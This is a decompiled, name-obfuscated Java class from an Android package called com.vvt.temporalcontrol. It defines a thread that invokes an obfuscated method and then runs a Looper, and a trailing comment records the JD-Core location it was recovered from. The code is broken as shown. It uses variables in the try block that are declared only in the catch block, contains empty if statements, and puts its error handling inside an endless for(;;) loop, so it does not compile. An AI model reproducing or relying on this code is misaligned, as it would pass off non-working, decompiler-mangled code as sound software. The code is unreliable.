package com.vvt.temporalcontrol.a;

import android.os.Looper;
import com.vvt.a.c;

class b
  extends Thread
{
  b(a parama, String paramString1, long paramLong, String paramString2)
  {
    super(paramString1);
  }
  
  public void run()
  {
    
    try
    {
      Object localObject1 = this.c;
      localObject1 = a.a((a)localObject1);
      if (localObject1 != null)
      {
        long l = this.a;
        int i = (int)l;
        bool = a.c();
        if (bool) {}
        localObject2 = this.c;
        localObject2 = a.a((a)localObject2);
        String str2 = com.vvt.m.b.c;
        String str3 = this.b;
        Object localObject3 = this.c;
        localObject3 = ((a)localObject3).a;
        ((com.vvt.a.a)localObject2).a(str2, str3, i, (c)localObject3);
      }
      localObject1 = this.c;
      localObject2 = Looper.myLooper();
      a.a((a)localObject1, (Looper)localObject2);
      Looper.loop();
      return;
    }
    catch (IllegalStateException localIllegalStateException)
    {
      for (;;)
      {
        boolean bool = a.d();
        if (bool) {}
        Object localObject2 = a.b(this.c);
        if (localObject2 != null)
        {
          localObject2 = a.b(this.c);
          ((d)localObject2).b();
        }
        localObject2 = this.c;
        String str1 = localIllegalStateException.toString();
        a.a((a)localObject2, str1);
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/temporalcontrol/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */